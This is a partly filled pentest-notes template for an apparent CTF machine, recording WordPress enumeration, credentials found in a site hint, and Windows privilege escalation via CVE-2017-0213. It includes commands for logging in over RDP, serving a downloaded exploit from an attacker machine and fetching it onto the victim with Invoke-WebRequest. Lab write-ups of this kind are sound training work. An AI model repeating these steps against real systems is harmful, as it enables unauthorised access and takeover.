Use this template in Obsidian to register your findings per target.

---
## 🖥️ Target System: `IP/Hostname`


<summary>1. 🧭 Initial Reconnaissance</summary>

- **Tools Used**: 
- **Host Discovery**:
  - Was the host alive? (Yes)
  - Ping Response:
  - No machine does not response to ICMP
- **Port Scan Results**:
  - Open Ports:
  - Service Versions:
  - OS Detection:
- **Notes**:

![[port_scan 3.txt]]

bl

---

<summary>2. 📂 Enumeration</summary>

- **Ports/Services Analyzed**: 
- **Tools Used**: gobuster, wpscan
- **Findings**:
  - Directories found: /retro
  - Enumerated users/accounts:
  - Software versions:
- **Screenshots/Proof**:

![[Pasted image 20250629132035.png]]



---

<summary>3. 🚨 Vulnerability Analysis</summary>

- **Identified Vulnerabilities**:
  - Description:
  - CVE/Exploit DB Ref:
- **Tool(s) Used**: 
- **Proof/Output**:
  - Command results, error messages, etc.

---


<summary>4. 💣 Exploitation</summary>

- **Tool(s) Used**:
- **Exploit/Payload**:
  - Command:
- **Result**:
  - Got Shell? User Access?
	
	- In the site there was an hint for the **==password==**
		- user: wade
		- pass: parzival
	
- **Post-Exploitation Notes**:
  - user.txt - Desktop
- **Proof**:
  - ![[proof-shell.png]]
---

<summary>5. 🪜 Privilege Escalation</summary>

- **Initial Access Level**: regular user
- **Techniques Tried**:
  - xfreerdp3
  - in google searching for winserver 2016 exploits - CVE-2017-0213 - https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-0213
  - downloaded file to attacker machine.
	  - created server in file location
		  - python3 -m http.server 8000

![[Pasted image 20250629153010.png]]

			- on victim machine:
				- enter machine via xfreerdp3
					- xfreerdp3 /u:wade /p:parzival /v:10.10.51.176

![[Pasted image 20250629152408.png]]
And get user flag.

						- to be able to get files from attacker machine server used the following command because wget and curl not recognized:
							- Invoke-WebRequest -Uri http://your-server-ip:8000/filename.txt -OutFile filename.txt

![[Pasted image 20250629152437.png]]

								- on victim machine execute file and we are nt authority\system

![[Pasted image 20250629152245.png]]

- **Success Path**:
  - Commands used:
- **Root Access?** Yes
- **Proof**:


![[Pasted image 20250629152553.png]]


---

<summary>6. 🗃️ Post-Exploitation</summary>

- **Files/Flags Accessed**:
- **Sensitive Data Found**:
  - Got root flag

![[Pasted image 20250629152723.png]]


- **Users Compromised**:
		root
- **Persistence (if tested)**:

---

<summary>7. 📓 Lessons Learned</summary>

- **What Worked**: windows CVE, users informatin for password retrievel, 
- **What Didn’t**:
- **To Improve**:

---

<summary>8. 📎 Appendix</summary>

- Screenshot Links:
  - ![[example.png]]
- Full Command Logs:
  - Use code blocks for clarity:
    ```bash
    command here
    output here
    ```
- Exploit Code Used:
  ```python
  # Sample exploit
